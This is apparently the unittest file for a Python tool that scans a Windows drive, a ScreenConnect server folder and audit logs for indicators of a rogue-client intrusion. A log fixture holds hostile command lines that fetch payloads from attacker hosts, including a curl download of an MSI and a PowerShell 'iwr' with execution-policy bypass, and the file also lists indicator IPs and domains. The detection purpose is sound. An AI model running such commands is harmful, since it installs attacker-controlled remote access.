"""Tests for sckit_hunt.py. Run from the project folder:  python3 -m unittest -v

They build a fake Windows system drive, a fake ScreenConnect server folder and a fake audit export in a
temporary directory, so they need no Windows machine and touch nothing on this one.
"""
import io
import json
import os
import shutil
import sys
import tempfile
import unittest
from contextlib import redirect_stdout

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import sckit_hunt as sh  # noqa: E402


def touch(path, text="x"):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


class Helpers(unittest.TestCase):
    def test_defang(self):
        self.assertEqual(sh.defang("185.99.255.28"), "185.99.255[.]28")
        self.assertEqual(sh.defang("ns.mo7sen.dev"), "ns.mo7sen[.]dev")
        self.assertEqual(sh.defang("sc.payproofkit.com"), "sc.payproofkit[.]com")

    def test_relay_host_from_service_command_line(self):
        image = ('"C:\\Program Files (x86)\\ScreenConnect Client (ed630cc2c873b091)\\ScreenConnect.ClientService.exe" '
                 '"?e=Access&y=Guest&h=soxnewwork.homedns.org&p=81&s=1&k=abc"')
        self.assertEqual(sh.relay_host(image), "soxnewwork.homedns.org")
        self.assertIsNone(sh.relay_host("C:\\Windows\\system32\\svchost.exe -k netsvcs"))

    def test_every_published_hash_is_a_sha256(self):
        for digest in sh.HASHES:
            self.assertRegex(digest, r"^[0-9a-f]{64}$")


class Endpoint(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.root)

    def infected(self):
        r = self.root
        touch(os.path.join(r, "ProgramData", "RelayTrap", "TrapWatch.ps1"), "# trap")
        touch(os.path.join(r, "ProgramData", "RelayTrap", "trapbins", "2588ef5c15954b10", "RelayTrap.exe"), "MZ")
        touch(os.path.join(r, "Windows", "System32", "Tasks", "TrapWatch"), "<Task/>")
        touch(os.path.join(r, "Windows", "Temp", "sckit-run.bat"), "@echo off")
        touch(os.path.join(r, "Windows", "Temp", "sc.msi"), "msi")
        touch(os.path.join(r, "Users", "Public", "RELAY-TRAP-PROOF.txt"), "trapped")
        touch(os.path.join(r, "Users", "tech", "AppData", "Local", "Temp", "Panel-Lateral.ps1"), "ps")
        touch(os.path.join(r, "Users", "tech", "AppData", "Local", "Temp", "k0123456789abcdef0123456789abcdef.ps1"), "ps")
        touch(os.path.join(r, "Users", "tech", "AppData", "Local", "Temp", "sqlite3.exe"), "MZ")
        touch(os.path.join(r, "Program Files (x86)", "ScreenConnect Client (2588ef5c15954b10)", "ScreenConnect.ClientService.exe"), "MZ")
        touch(os.path.join(r, "Program Files (x86)", "ScreenConnect Client (0123456789abcdef)", "ScreenConnect.ClientService.exe"), "MZ")

    def test_clean_drive_has_no_hits(self):
        touch(os.path.join(self.root, "Program Files (x86)", "ScreenConnect Client (0123456789abcdef)", "ScreenConnect.ClientService.exe"))
        f = sh.Findings()
        sh.scan_endpoint(self.root, f, allow={"0123456789abcdef"})
        self.assertEqual(f.hits, 0)
        self.assertTrue(any(i["level"] == "INFO" and "allow list" in i["what"] for i in f.items))

    def test_unknown_client_is_medium_until_allowed(self):
        touch(os.path.join(self.root, "Program Files (x86)", "ScreenConnect Client (0123456789abcdef)", "x"))
        f = sh.Findings()
        sh.scan_endpoint(self.root, f, allow=set())
        self.assertEqual([i["level"] for i in f.items], ["MEDIUM"])
        self.assertIn("--allow 0123456789abcdef", f.items[0]["what"])

    def test_infected_drive(self):
        self.infected()
        f = sh.Findings()
        sh.scan_endpoint(self.root, f, allow={"0123456789abcdef"})
        whats = " | ".join(i["what"] for i in f.items if i["level"] == "HIGH")
        for expected in ["RelayTrap", "scheduled task 'TrapWatch'", "RELAY-TRAP-PROOF.txt", "sckit-run.bat",
                         "Panel-Lateral.ps1", "k<32 hex>.ps1", "rogue ScreenConnect client 2588ef5c15954b10"]:
            self.assertIn(expected, whats)
        mediums = " | ".join(i["what"] for i in f.items if i["level"] == "MEDIUM")
        self.assertIn("sc.msi", mediums)            # a generic name: MEDIUM unless its hash is a published one
        self.assertIn("sqlite3.exe", mediums)
        self.assertEqual(sum(1 for i in f.items if "sc.msi" in i["what"]), 1, "reported once, not twice")
        self.assertGreaterEqual(f.hits, 9)

    def test_hash_match_is_reported(self):
        # A file whose content hashes to a published value: fake it by monkeypatching sha256 for one path.
        path = os.path.join(self.root, "Windows", "Temp", "runnew.cmd")
        touch(path, "curl")
        real = sh.sha256
        sh.sha256 = lambda p: "50659748723e906c8b3d3c0386bd4cf692f693a3e23639398c1a14d0c31fed61" if p == path else real(p)
        try:
            f = sh.Findings()
            sh.scan_endpoint(self.root, f, allow=set())
        finally:
            sh.sha256 = real
        item = next(i for i in f.items if i["where"] == path)
        self.assertIn("matches published runnew.cmd", item["detail"])


class Server(unittest.TestCase):
    def setUp(self):
        self.server = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.server)

    def test_rmm_plus_extension_is_flagged_and_others_are_not(self):
        ext = os.path.join(self.server, "App_Extensions")
        touch(os.path.join(ext, "2b4b6f3e-0000-4000-8000-000000000001", "Manifest.xml"),
              '<ExtensionManifest><Name>RMM+</Name><Setting Name="RMMPlus.AccessKey" IsServerOnly="true">'
              '<DefaultValue></DefaultValue></Setting></ExtensionManifest>')
        touch(os.path.join(ext, "9c1d0d2e-0000-4000-8000-000000000002", "Manifest.xml"),
              "<ExtensionManifest><Name>Report Manager</Name></ExtensionManifest>")
        f = sh.Findings()
        sh.scan_server(self.server, f)
        high = [i for i in f.items if i["level"] == "HIGH"]
        self.assertEqual(len(high), 1)
        self.assertIn("000000000001", high[0]["where"])
        self.assertIn("RMMPlus.AccessKey", high[0]["detail"])
        self.assertTrue(any(i["level"] == "INFO" and "000000000002" in i["where"] for i in f.items))

    def test_missing_folder_is_info_not_hit(self):
        f = sh.Findings()
        sh.scan_server(self.server, f)
        self.assertEqual(f.hits, 0)
        self.assertEqual(f.items[0]["level"], "INFO")


class Logs(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.dir)

    def test_indicators_in_an_audit_export(self):
        log = os.path.join(self.dir, "audit.csv")
        touch(log, "\n".join([
            "2026-11-11T17:48:02Z,RunCommand,tech1,curl.exe -o C:\\Windows\\TEMP\\sc.msi http://185.99.255.28/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Exploited17",
            "2026-11-11T17:48:09Z,RunCommand,tech1,powershell -ep bypass -c iwr https://ns.mo7sen.dev/EadF.php?p=4",
            "2026-11-11T17:49:00Z,Login,Addmin,ok",
            "2026-11-11T18:00:00Z,Session,tech2,ordinary support session",
        ]))
        f = sh.Findings()
        sh.scan_logs([log], f)
        whats = " | ".join(i["what"] for i in f.items)
        self.assertIn("185.99.255[.]28", whats)
        self.assertIn("ns.mo7sen[.]dev", whats)
        self.assertIn("c=Exploited<N>", whats)
        touch(log, "GET /Bin/UpdateConnect.ClientSetup.msi?e=Access&y=Guest&c=ExploitedNOTUSA from 185.241.211.197\n")
        f2 = sh.Findings()
        sh.scan_logs([log], f2)
        w2 = " | ".join(i["what"] for i in f2.items)
        self.assertIn("UpdateConnect.ClientSetup.msi", w2)
        self.assertIn("185.241.211[.]197", w2)
        self.assertIn("c=Exploited<N>", w2)
        self.assertIn("addmin", whats.lower())
        self.assertNotIn("ordinary support session", whats)
        self.assertTrue(all("185.99.255.28" not in i["what"] for i in f.items), "hosts are defanged in output")
        lines = {i["where"].split(":")[-1] for i in f.items}
        self.assertEqual(lines, {"1", "2", "3"})

    def test_source_instance_id_is_medium(self):
        log = os.path.join(self.dir, "panel.log")
        touch(log, "instance d905b2b1b165d0a9 pushed command\n")
        f = sh.Findings()
        sh.scan_logs([log], f)
        self.assertEqual(f.items[0]["level"], "MEDIUM")


class CommandLine(unittest.TestCase):
    def run_cli(self, *args):
        buf = io.StringIO()
        with redirect_stdout(buf):
            code = sh.main(list(args))
        return code, buf.getvalue()

    def test_exit_codes_and_json(self):
        root = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, root)
        touch(os.path.join(root, "Users", "Public", "nothing.txt"))
        code, out = self.run_cli("--root", root, "--no-registry")
        self.assertEqual(code, 0)
        self.assertIn("No published indicator found", out)
        touch(os.path.join(root, "ProgramData", "RelayTrap", "TrapWatch.ps1"))
        code, out = self.run_cli("--root", root, "--no-registry", "--json")
        self.assertEqual(code, 1)
        data = json.loads(out)
        self.assertTrue(any(i["level"] == "HIGH" for i in data["findings"]))
        self.assertGreaterEqual(len(data["sources"]), 3)

    def test_missing_root_is_exit_2(self):
        with redirect_stdout(io.StringIO()):
            self.assertEqual(sh.main(["--root", "/definitely/not/here"]), 2)


if __name__ == "__main__":
    unittest.main()
